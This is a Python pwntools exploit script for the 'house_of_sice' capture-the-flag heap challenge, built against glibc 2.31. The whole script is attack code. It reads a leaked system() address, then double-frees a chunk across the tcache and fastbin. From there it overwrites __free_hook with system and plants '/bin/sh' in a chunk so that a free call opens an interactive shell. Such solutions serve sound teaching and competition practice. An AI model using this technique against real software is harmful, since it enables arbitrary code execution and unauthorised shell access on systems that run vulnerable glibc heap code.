#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
exe = './house_of_sice'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

allocations = 0

def delightful(value):
    global allocations

    io.sendline('1')
    io.readuntil('> ')
    io.sendline('1')
    io.readuntil('> ')
    io.sendline(str(value))
    io.readuntil('> ')

    allocations += 1

    return allocations - 1

def devious(value):
    global allocations

    io.sendline('1')
    io.readuntil('> ')
    io.sendline('2')
    io.readuntil('> ')
    io.sendline(str(value))
    io.readuntil('> ')

    allocations += 1

    return allocations - 1

def sell(num):
    io.sendline('2')
    io.readuntil('> ')
    io.sendline(str(num))
    io.readuntil('> ')

elf = ELF(exe)
libc = ELF('./libc-2.31.so')

io = start(env={'LD_PRELOAD':'./libc-2.31.so'})
#io = remote('house-of-sice.hsc.tf', 1337)
#io.readline() # comment this line out for local, it's for POW addition
io.readline()
io.readline()
io.readline()

leak_line = io.readline()
system_addr = int(str(leak_line).split(': ')[1][0:14], 16)
log.info(f'system address: 0x{system_addr:x}')

libc.address = (system_addr - libc.sym.system)
log.info(f'libc base address: 0x{libc.address:x}')

io.readuntil('> ')

chunks = []

# allocate 7 chunks we can use to fill the tcache
for i in range(7):
    chunks.append(delightful(20))

# allocate from the top chunk using malloc
dup = delightful(20)

# fill the tcache
for num in range(7):
    sell(chunks[num])

# put first dup into the fastbin since tcache is full
sell(dup)

# pull from tcache to make room for dup
delightful(20)

# duplicate dup into tcache (first is in fastbin)
sell(dup)

# pull first copy of dup from fastbin writing the address to next ptr
devious(libc.sym.__free_hook)

# pull our dup out of the tcache making tcache's next chunk our ptr and write
# /bin/sh into a chunk that we can pass to the __free_hook
shchunk = delightful(u64(b'/bin/sh\0'))

# overwrite __free_hook with a pointer to system
delightful(libc.sym.system)

# invoke the __free_hook pointing to system with the chunk storing our
# /bin/sh string
log.info('free 10 to win!')
io.interactive() # we'll never get the '> ' so just free manually

